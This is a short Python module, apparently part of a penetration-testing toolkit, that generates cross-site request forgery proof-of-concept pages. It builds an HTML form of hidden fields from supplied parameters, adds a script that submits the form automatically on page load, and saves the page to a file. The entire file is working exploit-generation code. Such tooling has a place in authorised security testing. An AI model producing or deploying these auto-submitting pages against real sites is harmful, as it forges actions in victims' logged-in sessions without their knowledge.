from colorama import Fore, Style

def generate_csrf_html(target_url, action_url, method, data):
    html = f"""<html>
<body>
    <h2>CSRF PoC Exploit</h2>
    <form action="{action_url if action_url else target_url}" method="{method}">
"""
    
    # Add form fields from data
    for pair in data.split('&'):
        key, value = pair.split('=')
        html += f'        <input type="hidden" name="{key}" value="{value}">\n'
    
    html += """        <input type="submit" value="Submit Request">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>"""
    
    return html

def generate(url, data, action_url=None, method='POST', verbose=False, output_file=None):
    if not data:
        print(f"{Fore.RED}[!] No data provided for CSRF exploit{Style.RESET_ALL}")
        return
    
    html = generate_csrf_html(url, action_url, method, data)
    
    # Save to file
    filename = f"csrf_poc_{url.replace('://', '_').replace('/', '_')}.html"
    with open(filename, 'w') as f:
        f.write(html)
    
    msg = f"{Fore.GREEN}[+] CSRF PoC generated successfully!{Style.RESET_ALL}"
    msg += f"\nSaved to: {filename}\n"
    msg += f"\n{Fore.CYAN}[*] HTML Preview:{Style.RESET_ALL}\n"
    msg += "-"*50 + "\n"
    msg += html[:200] + "...\n" + "-"*50 + "\n"
    print(msg)
    
    if output_file:
        output_file.write(f"CSRF PoC generated: {filename}\n")